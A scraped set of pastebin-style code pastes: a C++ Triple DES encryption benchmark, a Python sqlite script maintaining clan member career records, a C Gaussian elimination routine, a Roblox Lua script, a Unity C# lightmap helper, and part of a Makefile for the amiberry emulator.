                        outFile.write(reinterpret_cast<char*>(&ciphertextBlock[i]), blockSize);
                    }
                }
            }

            // Update the counter after processing the blocks
            for (int i = 0; i < 8; ++i) {
                counter[i] = generateNextCounterValue(counter[i]);
            }
        }
    } // End of parallel region

    inFile.close();
    outFile.close();
}

void TripleDES::encryptBlocks(const uint64_t* counter, uint64_t* ciphertextBlock) {
    // First encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(counter[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys1[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }

    // Second encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(ciphertextBlock[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys2[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }

    // Third encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(ciphertextBlock[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys3[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }
}

uint64_t TripleDES::generateNextCounterValue(uint64_t counter) {
    return counter + 8; // Increment by the number of blocks processed
}

uint64_t TripleDES::getMillisTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto duration = now.time_since_epoch();
    auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
    return millis;
}

int main() {
    const char* inputFile = ""../data/input1MB.txt"";
    const char* outputFile = ""../data/output1MB_encrypted.txt"";
    uint64_t key1[3] = {0xA4B92905A4B92905, 0x0000000000000000, 0xA4B92905A4B92905};
    uint64_t key2[3] = {0xC567A1F3C567A1F3, 0x0000000000000000, 0xC567A1F3C567A1F3};
    uint64_t key3[3] = {0xE3D17F253E3D17F2, 0x0000000000000000, 0xE3D17F253E3D17F2};

    TripleDES des(key1, key2, key3);

    auto begin = des.getMillisTimestamp();
    des.encryptFile(inputFile, outputFile);
    auto end = des.getMillisTimestamp();

    auto duration_ms = end - begin;
    std::cout << ""Encryption completed in "" << duration_ms << "" ms."" << std::endl;

    return 0;
}
"
Qq5j3RBv,member-career,mrnosuch,Python,Thursday 9th of May 2024 04:46:50 AM CDT,"# -*- coding: utf-8 -*-

# Python 3

import os
import sys
import sqlite3
import bbot.discord


SCRIPT_PATH : str      = os.path.dirname(os.path.realpath(sys.argv[0]))
local_db_path :str     = ""/home/pi/Scripts/blastardbot/bot.db""  ## Production
# local_db_path :str     = ""/home/pi/Scripts/blastardbot/bot-dev.db""  ## Development


# Define queries

MEMBER_SELECT = '''
SELECT 
	rosterID
	clan_id, 
	name, 
	psn_id, 
	status,
	join_date, 
	exit_date, 
	return_date, 
	rec_id  
FROM 
	member
WHERE
	status IN ('Member','Alumni')
ORDER BY
	name;
'''

MEMBER_CAREER_SELECT = '''
SELECT
	name,
	psn_id,
	start_date,
	event,
	end_date,
	status,
	rosterID
FROM
	member_career
WHERE
	rosterID = :rosterID;
'''

CAREER_INSERT = '''
INSERT INTO
	career (
		rosterID,
		start_date,
		end_date,
		event,
		status
	)
VALUES (
    :rosterID,
    :start_date,
    :end_date,
    :event,
    :status
)
'''

CAREER_UPDATE_EXIT = '''
UPDATE 
    career
SET 
    end_date = :end_date,
    status   = :status
WHERE
    rosterID = :rosterID
AND
    start_date = :start_date
'''

CAREER_UPDATE_START = '''
UPDATE 
    career
SET 
    start_date = :new_start_date
WHERE
    rosterID = :rosterID
AND
    start_date = :old_start_date
'''

CAREER_DELETE_RETURN = '''
DELETE FROM 
    career
WHERE
    rosterID = :rosterID
AND
    start_date = :return_date
AND
    event = ""Return""
'''

CAREER_UPDATE_RETURN = '''
UPDATE 
    career
SET
    start_date = :return_date,
    status     = ""Active"",
    event      = ""Return""
WHERE
    rosterID = :rosterID
AND
    start_date = :event_date
'''

CAREER_CREATE_RETURN = '''
INSERT INTO
    career (start_date, event, rosterID, status)
VALUES (
    :return_date,
    'Return',
    :rosterID,
    'Active'
)
'''

# define classes

class CareerSummary():

    rosterID        = None
    name            = None
    missing         = True
    prev_start      = None
    join_date       = None
    exit_date       = None
    return_date     = None
    status          = None
    last_event      = None
    event_count     = 0
    last_event_date = None
    career_data     = None
    db              = None

    def __init__(self, db, rosterID, name):

        self.rosterID    = rosterID
        self.name        = name
        self.db          = db

        self.career_load()
        

    def career_load(self):

        self.missing         = True
        self.prev_start      = None
        self.join_date       = None
        self.exit_date       = None
        self.return_date     = None
        self.status          = None
        self.last_event      = None
        self.event_count     = 0
        self.last_event_date = None

        self.career_data =  db_select(self.db, MEMBER_CAREER_SELECT, {'rosterID' : self.rosterID})

        if len(self.career_data) > 0:

            self.missing = False
            self.event_count = len(self.career_data)
            self.last_event = self.career_data[self.event_count-1]['event']
            self.last_event_date = self.career_data[self.event_count-1]['start_date']
            self.join_date = self.career_data[0]['start_date']
            self.exit_date = self.career_data[0]['end_date']
            self.status = self.career_data[self.event_count-1]['status']

            if self.event_count > 1:
                self.prev_start = self.career_data[self.event_count-2]['start_date']
            else:
                self.prev_start = self.career_data[0]['start_date']

        else:
            print(""No career events found."")

        for career_event in self.career_data:

            if not self.exit_date:
                self.exit_date = career_event['end_date']
            else:
                if career_event['end_date'] and self.exit_date < career_event['end_date']:
                    self.exit_date = career_event['end_date']

            if career_event['start_date']>self.join_date and career_event['start_date']>noneToEmpty(self.return_date):
                self.return_date = career_event['start_date']

        print(self)

    def career_create(self, join_date):

        options = {
            'rosterID' : self.rosterID,
            'start_date' : join_date,
            'end_date' : None,
            'event' : 'Join',
            'status' : 'Active'
        }

        db_execute(self.db, CAREER_INSERT, options)
        print(f""Join event on {join_date} created for {self.name} ({self.rosterID})."")

        self.career_load()


    def join_update(self, join_date):

        options = {
            'rosterID' : self.rosterID,
            'old_start_date' : self.join_date,
            'new_start_date' : join_date
        }
        db_execute(self.db, CAREER_UPDATE_START, options)
        print(f""Join event update from {self.join_date} to {join_date} for {self.name} ({self.rosterID})"")

        self.career_load()


    def exit_update(self, exit_date, return_date):
       
        print(f""Current exit date is: {self.exit_date}"")
        print(f""    New exit will be: {exit_date}, return date: {return_date}"")
        event_date = self.last_event_date
        event_status = ""Alumni""

        # It's NOT possible to have a return date and NO exit date
        if return_date and not exit_date:
            print(""Error! Return without exit!"")
            return

        # Possible that exit date was reverted to None
        if not exit_date:
            event_status = ""Active""
            print(""Updating exit with ACTIVE status."")

        
        if return_date and return_date > exit_date:
            # If the return date is AFTER the exit date, the end date should be on last career event
            event_date = self.prev_start
    
        options = {
            'rosterID'   : self.rosterID,
            'start_date' : event_date,
            'end_date'   : exit_date,
            'status'     : event_status
        }

        db_execute(self.db, CAREER_UPDATE_EXIT, options)
        print(f""Updating exit date to {exit_date} and status {event_status} for event starting on {event_date} for {self.name} ({self.rosterID})."")

        self.career_load()


    def return_update(self, return_date, exit_date):

        if not return_date:

            # This will be a deletion of the last event in the career
            options = {
                'rosterID' : self.rosterID,
                'return_date' : self.return_date
            }            

            print(f""Removing return event from {self.name} ({self.rosterID})"")
            db_execute(self.db, CAREER_DELETE_RETURN, options)

        else:

            # We need to figure out if we are UPDATING a return date
            # or creating a new returning event

            # If the return_date is BEFORE the exit_date, it's an update

            if (return_date < exit_date):

                # We are updating
                options = {
                    'rosterID' : self.rosterID,
                    'return_date' : self.return_date,
                    'event_date'  : self.last_event_date
                }  
                db_execute(self.db, CAREER_UPDATE_RETURN, options)
                print(f""Updating return date {self.return_date} for {self.name} ({self.rosterID})."")

            else:

                # If the return date is AFTER the exit date, it's a new return event

                # Just check status to be safe. Only an alumni can return

                if self.status == ""Alumni"":
                    # We are creating a new event
                    options = {
                        'rosterID' : self.rosterID,
                        'return_date' : return_date
                    }
                    db_execute(self.db, CAREER_CREATE_RETURN, options)
                    print(f""Creating return event on {return_date} for {self.name} ({self.rosterID})."")
                else:
                    print(f""Can't add an exit event as {self.name} (self.rosterID) isn't alumni."")
        
        self.career_load()

    def event_sync(self, join_date, exit_date, return_date):

        if self.missing:

            # Create career if missing

            print(""* No career data found. Creating..."")
            self.career_create(join_date)

        else:

            # Otherwise update join date if there's a difference
                       
            if join_date != self.join_date:
                print(""* Join date mismatch. Updating join date..."") 
                self.join_update(join_date)

        if exit_date != self.exit_date:
            print(""* Exit data mismatch. Updating exit date..."")
            self.exit_update(exit_date, return_date)

        if return_date != self.return_date:
            print(""* Return date mismatch. Updating return date..."")
            self.return_update(return_date, exit_date)


    def __str__(self):
        return f""Career for {self.name} ({self.rosterID}) status {self.status} - join: {self.join_date}, exit: {self.exit_date}, return: {self.return_date}, events: {self.event_count}""


# Define functions

def noneOrNull(v):

    if v is None:
        return True
    if len(v) is 0:
        return True
    return False

def noneToEmpty(v):
    if v is None:
        return """"
    else:
        return v

def emptyToNone(v):

    if v == """":
        return None
    return v


def db_open():

    print(""Opening database: "",local_db_path)    

    db = sqlite3.connect(local_db_path)
    db.row_factory = sqlite3.Row

    return db


def db_close(db):

    print(""Closing data base."")
    db.commit()
    db.close()


def db_select(db, query, options = None):

    cur = db.cursor()

    if options is not None:
        rows = cur.execute(query, options).fetchall()
    else:
        rows = cur.execute(query).fetchall()

    data=[{k: item[k] for k in item.keys()} for item in rows]

    return data     


def db_execute(db, query, options):

    cur = db.cursor()

    cur.execute(query, options)

    db.commit()


def members_fetch(db):

    print(""Loading all current and previous members."")

    members=db_select(db, MEMBER_SELECT)

    return members

def member_check(db, members):

    member_count = 0

    for m in members:

        member_count = member_count + 1

        # Career rows are
        #   rosterID
        #   start_date
        #   event (Join, Return)
        #   end_date
        #   status (Active, Alumni)

        # Rules for career updates
        #   Info in members must have:
                # join_date must be the earliest date
                # When return_date is defined:
                #   If return date is > exit_date, member is active
                #   If return date is < exit_date, member is alumni
                # exit_date must come after join_date (if it exists)
        #   If the member row doesn't follow this, 
        #   it won't be processed as it is considered invalid.

        member_name = m['name']
        rosterID    = m['clan_id']
        join_date   = emptyToNone(m['join_date'])
        exit_date   = emptyToNone(m['exit_date'])
        return_date = emptyToNone(m['return_date'])

        print(f""===== Roster data for #{member_count}, {member_name} ({rosterID}) join: {join_date} exit: {exit_date} return: {return_date} ====="")

        summary = CareerSummary(db, rosterID, member_name)
        summary.event_sync(join_date, exit_date, return_date)
        

#
# MAIN PROCEDURE
#

db = db_open()

members = members_fetch(db)

member_check(db, members)

print(""\n----\n"")
db_close(db)"
5jdavrjk,Untitled,Gaxil,C,Thursday 9th of May 2024 04:45:25 AM CDT,"#include <stdio.h>
#include <stdlib.h>

void print_lematrix(float **lematrix, int dim) {
    int i, j;

    for (j = 0; j < dim; j++) {
        for (i = 0; i < dim + 1; i++)
            printf(""%10.4f"", lematrix[j][i]);
        printf(""\n"");
    }
    printf(""\n\n"");
}

float **allocate_lematrix(int dim) {
    float **A = (float **)malloc(dim * sizeof(float *));
    for (int i = 0; i < dim; ++i) {
        A[i] = (float *)malloc((dim + 1) * sizeof(float));
    }
    return A;
}

void gem(float **A, int n, float *x) {
    int i, j, k;
    float c, sum = 0.0;

    print_lematrix(A, n);


    for (i = 0; i < n - 1; i++) {
        for (j = i + 1; j < n; j++) {
            c = A[j][i] / A[i][i];
            for (k = i; k < n + 1; k++) {
                A[j][k] -= c * A[i][k];
            }
        }
    }

    print_lematrix(A, n);

    for (i = n - 1; i >= 0; i--) {
        sum = 0.0;
        for (j = i + 1; j < n; j++) {
            sum += A[i][j] * x[j];
        }
        x[i] = (A[i][n] - sum) / A[i][i];
    }
}

int main() {
    int i, n;

    n = 3;
    float **A = allocate_lematrix(n);

    float **B = allocate_lematrix(n);
    float *x = (float *)malloc(n * sizeof(float));

    A[0][0] = 1.0;
    A[0][1] = 1.0;
    A[0][2] = 1.0;
    A[0][3] = 9.0;
    A[1][0] = 2.0;
    A[1][1] = -3.0;
    A[1][2] = 4.0;
    A[1][3] = 13.0;
    A[2][0] = 3.0;
    A[2][1] = 4.0;
    A[2][2] = 5.0;
    A[2][3] = 40.0;

    B[0][0] = 10.0;
    B[0][1] = -7.0;
    B[0][2] = 3.0;
    B[0][3] = 5.0;
    B[1][0] = -6.0;
    B[1][1] = 8.0;
    B[1][2] = 4.0;
    B[1][3] = 7.0;
    B[2][0] = 2.0;
    B[2][1] = 6.0;
    B[2][2] = 9.0;
    B[2][3] = -1.0;

    gem(A, n, x);

    printf(""\nReseni: \n"");
    for (i = 0; i < n; i++) printf(""\nx%d=%f"", i, x[i]);

    printf(""\n\n\n\n\n\n"");



    gem(B, n, x);

    printf(""\nReseni: \n"");
    for (i = 0; i < n; i++) printf(""\nx%d=%f"", i, x[i]);

    return 0;
}
"
sUS5cFAA,Write script for All Union and Parts on Roblox Studio change All MaterialVariant to <None> |,LikeRampage,Lua,Thursday 9th of May 2024 04:33:59 AM CDT,"-Write script for All Union on Roblox Studio change All MaterialVariant to <None>

-- Script to change the MaterialVariant of all Unions to 'None'
for _, item in pairs(workspace:GetDescendants()) do
    if item:IsA(""UnionOperation"") then
        item.MaterialVariant = """" -- Setting to an empty string to represent 'None'
    end
end


-- Script to change the MaterialVariant of all Parts to 'None'
for _, item in pairs(workspace:GetDescendants()) do
    if item:IsA(""Part"") then
        item.MaterialVariant = """" -- Setting to an empty string to represent 'None'
    end
end

--[[
     Adding two ['s and ]'s makes it a
     multi-line comment.
	To change the MaterialVariant property of all Union objects in Roblox Studio to 'None', you can use the following Lua script. Please note that 'None' is not a standard option for MaterialVariant, so this script will set the MaterialVariant to an empty string, which is the equivalent of having no variant:

To execute this script, open the command bar in Roblox Studio (View -> Command Bar), paste the script into it, and press Enter. Always make sure to test scripts in a safe environment to avoid unintended changes to your game. If 'None' becomes a valid option for MaterialVariant in a future update of Roblox, you should replace the empty string """" with 'None'.
--]]

--[[
     Adding two ['s and ]'s makes it a
     multi-line comment.
	Certainly! Below is a Lua script for Roblox Studio that will change the MaterialVariant property of all Part objects to 'None'. Since 'None' is not a standard option for MaterialVariant, the script sets the MaterialVariant to an empty string, which effectively removes any variant:

To run this script in Roblox Studio, you can paste it into the command bar and press Enter. Make sure to test the script in a safe environment first to ensure it works as expected without affecting your main project. If you have any more requests or need further assistance, feel free to ask!
--]]

"
iRqZ2ycn,Create Lightmap UV,Staggart,C#,Thursday 9th of May 2024 04:01:31 AM CDT,"using System;
using UnityEngine;

namespace sc.modeling.splines.runtime.auxiliary
{
    [ExecuteAlways]
    public class SplineMesherLightmapUV : MonoBehaviour
    {
        [Tooltip(""Let Unity automatically create a new UV (slow but accurate)"")]
        public bool autoUnwrap = true;
        public SplineMesher splineMesher;
        
        private void Reset()
        {
            splineMesher = GetComponent<SplineMesher>();
        }
        
        private void OnEnable()
        {
            //Subscribe
            SplineMesher.onPostRebuildMesh += OnPostRebuild;
        }

        private void OnPostRebuild(SplineMesher instance)
        {
            //Is the instance being rebuild the one we want to work with
            if (instance == splineMesher)
            {
                MeshFilter mf = splineMesher.GetComponent<MeshFilter>();

                if (mf)
                {
                    #if UNITY_EDITOR
                    if (autoUnwrap)
                    {
                        UnityEditor.Unwrapping.GenerateSecondaryUVSet(mf.sharedMesh);
                    }
                    else
                    {
                        mf.sharedMesh.uv2 = mf.sharedMesh.uv;
                    }
                    #endif
                }
            }
        }

        private void OnDisable()
        {
            //Unsubscribe
            SplineMesher.onPostRebuildMesh -= OnPostRebuild;
        }
    }
}"
mW1G3FRi,amiberry wbx,feos,Make,Thursday 9th of May 2024 03:32:02 AM CDT,"CORE_DIR := amiberry

TARGET := amiberry.wbx

CXXFLAGS = -MT $@ -MF $(@:%.o=%.d) \
	-I$(CORE_DIR)/external/libguisan/include \
	-I$(CORE_DIR)/src \
	-I$(CORE_DIR)/src/osdep \
	-I$(CORE_DIR)/src/threaddep \
	-I$(CORE_DIR)/src/include \
	-I$(CORE_DIR)/src/archivers \
	-I$(CORE_DIR)/src/floppybridge \
	-I$(CORE_DIR)/external/mt32emu/src \
	-D_FILE_OFFSET_BITS=64

CCFLAGS=-pipe -Wno-shift-overflow -Wno-narrowing

LDFLAGS = -Wl,-O1 -Wl,--hash-style=gnu -Wl,--as-needed -lpthread -lz -lrt -ldl

SRCS = \
	$(CORE_DIR)/src/archivers/7z/7zAlloc.c \
	$(CORE_DIR)/src/archivers/7z/7zArcIn.c \
	$(CORE_DIR)/src/archivers/7z/7zBuf.c \
	$(CORE_DIR)/src/archivers/7z/7zBuf2.c \
	$(CORE_DIR)/src/archivers/7z/7zCrc.c \
	$(CORE_DIR)/src/archivers/7z/7zCrcOpt.c \
	$(CORE_DIR)/src/archivers/7z/7zDec.c \
	$(CORE_DIR)/src/archivers/7z/7zFile.c \
	$(CORE_DIR)/src/archivers/7z/7zStream.c \
	$(CORE_DIR)/src/archivers/7z/Aes.c \
	$(CORE_DIR)/src/archivers/7z/AesOpt.c \
	$(CORE_DIR)/src/archivers/7z/Alloc.c \
	$(CORE_DIR)/src/archivers/7z/Bcj2.c \
	$(CORE_DIR)/src/archivers/7z/Bra.c \
	$(CORE_DIR)/src/archivers/7z/Bra86.c \
	$(CORE_DIR)/src/archivers/7z/BraIA64.c \
	$(CORE_DIR)/src/archivers/7z/CpuArch.c \
	$(CORE_DIR)/src/archivers/7z/Delta.c \
	$(CORE_DIR)/src/archivers/7z/LzFind.c \
	$(CORE_DIR)/src/archivers/7z/Lzma2Dec.c \
	$(CORE_DIR)/src/archivers/7z/Lzma2Enc.c \
	$(CORE_DIR)/src/archivers/7z/Lzma86Dec.c \
	$(CORE_DIR)/src/archivers/7z/Lzma86Enc.c \
	$(CORE_DIR)/src/archivers/7z/LzmaDec.c \
	$(CORE_DIR)/src/archivers/7z/LzmaEnc.c \
	$(CORE_DIR)/src/archivers/7z/LzmaLib.c \
	$(CORE_DIR)/src/archivers/7z/Ppmd7.c \
	$(CORE_DIR)/src/archivers/7z/Ppmd7Dec.c \
	$(CORE_DIR)/src/archivers/7z/Ppmd7Enc.c \
	$(CORE_DIR)/src/archivers/7z/Sha256.c \
	$(CORE_DIR)/src/archivers/7z/Sort.c \
	$(CORE_DIR)/src/archivers/7z/Xz.c \
	$(CORE_DIR)/src/archivers/7z/XzCrc64.c \
	$(CORE_DIR)/src/archivers/7z/XzCrc64Opt.c \
	$(CORE_DIR)/src/archivers/7z/XzDec.c \
	$(CORE_DIR)/src/archivers/7z/XzEnc.c \
	$(CORE_DIR)/src/archivers/7z/XzIn.c \
	$(CORE_DIR)/src/archivers/chd/utf8proc.c \
	$(CORE_DIR)/src/a2065.cpp \
	$(CORE_DIR)/src/a2091.cpp \
	$(CORE_DIR)/src/akiko.cpp \
	$(CORE_DIR)/src/amax.cpp \
	$(CORE_DIR)/src/ar.cpp \
	$(CORE_DIR)/src/arcadia.cpp \
	$(CORE_DIR)/src/audio.cpp \
	$(CORE_DIR)/src/autoconf.cpp \
	$(CORE_DIR)/src/blitfunc.cpp \
	$(CORE_DIR)/src/blittable.cpp \
	$(CORE_DIR)/src/blitter.cpp \
	$(CORE_DIR)/src/blkdev.cpp \
	$(CORE_DIR)/src/blkdev_cdimage.cpp \
	$(CORE_DIR)/src/bsdsocket.cpp \
	$(CORE_DIR)/src/calc.cpp \
	$(CORE_DIR)/src/cd32_fmv.cpp \
	$(CORE_DIR)/src/cd32_fmv_genlock.cpp \
	$(CORE_DIR)/src/cdrom.cpp \
	$(CORE_DIR)/src/cdtv.cpp \
	$(CORE_DIR)/src/cdtvcr.cpp \
	$(CORE_DIR)/src/cfgfile.cpp \
	$(CORE_DIR)/src/cia.cpp \
	$(CORE_DIR)/src/consolehook.cpp \
	$(CORE_DIR)/src/cpuboard.cpp \
	$(CORE_DIR)/src/crc32.cpp \
	$(CORE_DIR)/src/custom.cpp \
	$(CORE_DIR)/src/debug.cpp \
	$(CORE_DIR)/src/def_icons.cpp \
	$(CORE_DIR)/src/devices.cpp \
	$(CORE_DIR)/src/disk.cpp \
	$(CORE_DIR)/src/diskutil.cpp \
	$(CORE_DIR)/src/dlopen.cpp \
	$(CORE_DIR)/src/dongle.cpp \
	$(CORE_DIR)/src/draco.cpp \
	$(CORE_DIR)/src/drawing.cpp \
	$(CORE_DIR)/src/driveclick.cpp \
	$(CORE_DIR)/src/ethernet.cpp \
	$(CORE_DIR)/src/events.cpp \
	$(CORE_DIR)/src/expansion.cpp \
	$(CORE_DIR)/src/fdi2raw.cpp \
	$(CORE_DIR)/src/filesys.cpp \
	$(CORE_DIR)/src/flashrom.cpp \
	$(CORE_DIR)/src/fpp.cpp \
	$(CORE_DIR)/src/fsdb.cpp \
	$(CORE_DIR)/src/fsusage.cpp \
	$(CORE_DIR)/src/gayle.cpp \
	$(CORE_DIR)/src/gfxboard.cpp \
	$(CORE_DIR)/src/gfxutil.cpp \
	$(CORE_DIR)/src/hardfile.cpp \
	$(CORE_DIR)/src/hrtmon.rom.cpp \
	$(CORE_DIR)/src/ide.cpp \
	$(CORE_DIR)/src/idecontrollers.cpp \
	$(CORE_DIR)/src/identify.cpp \
	$(CORE_DIR)/src/ini.cpp \
	$(CORE_DIR)/src/inputdevice.cpp \
	$(CORE_DIR)/src/inputrecord.cpp \
	$(CORE_DIR)/src/isofs.cpp \
	$(CORE_DIR)/src/keybuf.cpp \
	$(CORE_DIR)/src/main.cpp \
	$(CORE_DIR)/src/memory.cpp \
	$(CORE_DIR)/src/midiemu.cpp \
	$(CORE_DIR)/src/native2amiga.cpp \
	$(CORE_DIR)/src/ncr9x_scsi.cpp \
	$(CORE_DIR)/src/ncr_scsi.cpp \
	$(CORE_DIR)/src/parser.cpp \
	$(CORE_DIR)/src/rommgr.cpp \
	$(CORE_DIR)/src/rtc.cpp \
	$(CORE_DIR)/src/sampler.cpp \
	$(CORE_DIR)/src/savestate.cpp \
	$(CORE_DIR)/src/scp.cpp \
	$(CORE_DIR)/src/scsi.cpp \
	$(CORE_DIR)/src/scsiemul.cpp \
	$(CORE_DIR)/src/scsitape.cpp \
	$(CORE_DIR)/src/statusline.cpp \
	$(CORE_DIR)/src/tabletlibrary.cpp \
	$(CORE_DIR)/src/tinyxml2.cpp \
	$(CORE_DIR)/src/traps.cpp \
	$(CORE_DIR)/src/uaeexe.cpp \
	$(CORE_DIR)/src/uaelib.cpp \
	$(CORE_DIR)/src/uaenative.cpp \
	$(CORE_DIR)/src/uaeresource.cpp \
	$(CORE_DIR)/src/uaeserial.cpp \
	$(CORE_DIR)/src/zfile.cpp \
	$(CORE_DIR)/src/zfile_archive.cpp \
	$(CORE_DIR)/src/archivers/chd/avhuff.cpp \
	$(CORE_DIR)/src/archivers/chd/bitmap.cpp \
	$(CORE_DIR)/src/archivers/chd/cdrom.cpp \
	$(CORE_DIR)/src/archivers/chd/chd.cpp \
	$(CORE_DIR)/src/archivers/chd/chdcd.cpp \
	$(CORE_DIR)/src/archivers/chd/chdcodec.cpp \
	$(CORE_DIR)/src/archivers/chd/corealloc.cpp \
	$(CORE_DIR)/src/archivers/chd/corefile.cpp \
	$(CORE_DIR)/src/archivers/chd/corestr.cpp \
	$(CORE_DIR)/src/archivers/chd/flac.cpp \
	$(CORE_DIR)/src/archivers/chd/harddisk.cpp \
	$(CORE_DIR)/src/archivers/chd/hashing.cpp \
	$(CORE_DIR)/src/archivers/chd/huffman.cpp \
	$(CORE_DIR)/src/archivers/chd/md5.cpp \
	$(CORE_DIR)/src/archivers/chd/osdcore.cpp \
	$(CORE_DIR)/src/archivers/chd/osdlib_unix.cpp \
	$(CORE_DIR)/src/archivers/chd/osdsync.cpp \
	$(CORE_DIR)/src/archivers/chd/palette.cpp \
	$(CORE_DIR)/src/archivers/chd/posixdir.cpp \
	$(CORE_DIR)/src/archivers/chd/posixfile.cpp \
	$(CORE_DIR)/src/archivers/chd/posixptty.cpp \
	$(CORE_DIR)/src/archivers/chd/posixsocket.cpp \
	$(CORE_DIR)/src/archivers/chd/strconv.cpp \
	$(CORE_DIR)/src/archivers/chd/strformat.cpp \
	$(CORE_DIR)/src/archivers/chd/unicode.cpp \
	$(CORE_DIR)/src/archivers/chd/vecstream.cpp \
	$(CORE_DIR)/src/archivers/dms/crc_csum.cpp \
	$(CORE_DIR)/src/archivers/dms/getbits.cpp \
	$(CORE_DIR)/src/archivers/dms/maketbl.cpp \
	$(CORE_DIR)/src/archivers/dms/pfile.cpp \
	$(CORE_DIR)/src/archivers/dms/tables.cpp \
	$(CORE_DIR)/src/archivers/dms/u_deep.cpp \
	$(CORE_DIR)/src/archivers/dms/u_heavy.cpp \
	$(CORE_DIR)/src/archivers/dms/u_init.cpp \
	$(CORE_DIR)/src/archivers/dms/u_medium.cpp \
	$(CORE_DIR)/src/archivers/dms/u_quick.cpp \
	$(CORE_DIR)/src/archivers/dms/u_rle.cpp \
	$(CORE_DIR)/src/archivers/lha/crcio.cpp \
	$(CORE_DIR)/src/archivers/lha/dhuf.cpp \
	$(CORE_DIR)/src/archivers/lha/header.cpp \
	$(CORE_DIR)/src/archivers/lha/huf.cpp \
	$(CORE_DIR)/src/archivers/lha/larc.cpp \
	$(CORE_DIR)/src/archivers/lha/lhamaketbl.cpp \
	$(CORE_DIR)/src/archivers/lha/lharc.cpp \
	$(CORE_DIR)/src/archivers/lha/shuf.cpp \
	$(CORE_DIR)/src/archivers/lha/slide.cpp \
	$(CORE_DIR)/src/archivers/lha/uae_lha.cpp \
	$(CORE_DIR)/src/archivers/lha/util.cpp \
	$(CORE_DIR)/src/archivers/lzx/unlzx.cpp \
	$(CORE_DIR)/src/archivers/mp2/kjmp2.cpp \
	$(CORE_DIR)/src/archivers/wrp/warp.cpp \
	$(CORE_DIR)/src/archivers/zip/unzip.cpp \
	$(CORE_DIR)/src/caps/caps_amiberry.cpp \
	$(CORE_DIR)/src/machdep/support.cpp \
	$(CORE_DIR)/src/floppybridge/ArduinoFloppyBridge.cpp \
	$(CORE_DIR)/src/floppybridge/ArduinoInterface.cpp \
	$(CORE_DIR)/src/floppybridge/CommonBridgeTemplate.cpp \
	$(CORE_DIR)/src/floppybridge/floppybridge_lib.cpp \
	$(CORE_DIR)/src/floppybridge/ftdi.cpp \
	$(CORE_DIR)/src/floppybridge/GreaseWeazleBridge.cpp \
	$(CORE_DIR)/src/floppybridge/GreaseWeazleInterface.cpp \
	$(CORE_DIR)/src/floppybridge/pll.cpp \
	$(CORE_DIR)/src/floppybridge/RotationExtractor.cpp \
	$(CORE_DIR)/src/floppybridge/SerialIO.cpp \
	$(CORE_DIR)/src/floppybridge/SuperCardProBridge.cpp \
	$(CORE_DIR)/src/floppybridge/SuperCardProInterface.cpp \
	$(CORE_DIR)/src/floppybridge/FloppyBridge.cpp \
	$(CORE_DIR)/src/osdep/ahi_v1.cpp \
	$(CORE_DIR)/src/osdep/bsdsocket_host.cpp \
	$(CORE_DIR)/src/osdep/cda_play.cpp \
	$(CORE_DIR)/src/osdep/charset.cpp \
	$(CORE_DIR)/src/osdep/fsdb_host.cpp \
	$(CORE_DIR)/src/osdep/clipboard.cpp \
	$(CORE_DIR)/src/osdep/amiberry_hardfile.cpp \
	$(CORE_DIR)/src/osdep/keyboard.cpp \
	$(CORE_DIR)/src/osdep/midi.cpp \
	$(CORE_DIR)/src/osdep/mp3decoder.cpp \
	$(CORE_DIR)/src/osdep/picasso96.cpp \
	$(CORE_DIR)/src/osdep/writelog.cpp \
	$(CORE_DIR)/src/osdep/amiberry.cpp \
	$(CORE_DIR)/src/osdep/ahi_v2.cpp \
	$(CORE_DIR)/src/osdep/amiberry_dbus.cpp \
	$(CORE_DIR)/src/osdep/amiberry_filesys.cpp \
	$(CORE_DIR)/src/osdep/amiberry_input.cpp \
	$(CORE_DIR)/src/osdep/amiberry_gfx.cpp \
	$(CORE_DIR)/src/osdep/amiberry_gui.cpp \
	$(CORE_DIR)/src/osdep/amiberry_mem.cpp \
	$(CORE_DIR)/src/osdep/amiberry_serial.cpp \
	$(CORE_DIR)/src/osdep/amiberry_uaenet.cpp \
	$(CORE_DIR)/src/osdep/amiberry_whdbooter.cpp \
	$(CORE_DIR)/src/osdep/ioport.cpp \
	$(CORE_DIR)/src/osdep/sigsegv_handler.cpp \
	$(CORE_DIR)/src/osdep/socket.cpp \
	$(CORE_DIR)/src/osdep/retroarch.cpp \
	$(CORE_DIR)/src/osdep/vpar.cpp \
	$(CORE_DIR)/src/sounddep/sound.cpp \
	$(CORE_DIR)/src/threaddep/threading.cpp \
	$(CORE_DIR)/src/osdep/gui/ControllerMap.cpp \
	$(CORE_DIR)/src/osdep/gui/SelectorEntry.cpp \
	$(CORE_DIR)/src/osdep/gui/ShowCustomFields.cpp \
